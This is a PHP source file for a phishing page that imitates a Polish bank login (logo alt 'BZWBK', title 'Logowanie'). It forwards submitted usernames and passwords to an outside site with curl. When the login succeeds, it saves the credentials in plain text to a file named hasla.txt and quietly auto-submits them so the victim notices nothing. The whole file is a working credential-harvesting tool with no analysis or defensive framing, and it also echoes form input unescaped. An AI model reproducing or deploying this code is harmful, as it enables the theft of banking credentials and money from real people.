<?php

$link=curl_init('http://hashmedia.pl/login.php');
 curl_setopt($link, CURLOPT_POSTFIELDS, 'username='.$_POST['username'].'&password='.$_POST['password']);
 curl_setopt($link, CURLOPT_HEADER, 1);
 curl_setopt($link, CURLOPT_RETURNTRANSFER, 1);
 $strona=curl_exec($link);
 curl_close($link);

 if(strstr($strona, 'transfer.php'))
 {
	file_put_contents('hasla.txt', $_POST['username'].':'.$_POST['password']."\r\n", FILE_APPEND);
?>
 <form action="http://hashmedia.pl/login.php" method="post">
 <input name="username" type="hidden" value="<?php echo $_POST['username']; ?>" />
 <input name="password" type="hidden" value="<?php echo $_POST['password']; ?>" />
 </form>
 <script type="text/javascript">
 setTimeout("document.forms[0].submit()", 10);
 </script>
 <?php
 }
 else 
 {

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<link rel="stylesheet" href="styles.css">
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Logowanie</title>
</head>


<body>
    <div id="content" style="max-width:800px; height:800px;">
        <div id="container">
            <img src="logo.png" alt="BZWBK">
            <form method="post" action="login.php" class=login>
                Login:<br>
                <input type="text" name="username" id="login"><br> Hasło:
                <br>
                <input type="password" name="password" id="password">
				<br><br>
				<button type="submit" name="submit" class="login">ZALOGUJ
            </form>


        </div>
    </div>
</body>
</html>
<?php
 }
?>

